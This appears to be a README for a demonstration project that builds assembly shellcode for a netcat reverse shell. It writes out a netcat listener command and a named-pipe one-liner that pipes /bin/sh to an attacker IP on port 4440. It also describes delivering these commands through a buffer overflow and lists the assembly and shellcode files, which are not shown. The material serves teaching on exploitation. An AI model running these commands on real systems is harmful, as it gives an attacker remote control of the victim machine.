# ReverseShell
Assemble code for establishing a reverse shell

Since this code is for demonstration purposes, the attacker and the victim system is the same.

1. Have your attacker system listening on port 4440 using command
"nc -lvp 4440"

2. On the victim system you have to execute the following commands:
a. "mknod /tmp/bpc p". This command creates a pipe that can be used with tcp connections to transmit/receive data.
b. "/bin/sh 0</tmp/bpc | nc <attacker_ip> 4440 1>/tmp/bpc". In our case <attacker_ip> would be "localhost". This command uses the created pipe /tmp/bpc to listen for and transmit tcp data to localhost:4440.

In order to establish a reverse shell, the attacker has to execute commands listed in 2 on victims system. This can be done by exploiting a buffer overflow vulnerability in the victims system.

Once a buffer overflow vulnerablitiy is found, an attacker can use the shellcodes for the above mentioned commands and use them with the overflow exploit code.

myattempt.s - Assembly code to execute command "mknod /tmp/bpc p" on the victim system
myattempt.txt - shellcode for myattempt.s
myattempt0.s - Assembly code to execute command "/bin/sh 0</tmp/bpc | nc localhost 4440 1>/tmp/bpc" on the victim system
myattempt0.txt - shellcode for myattempt0.txt
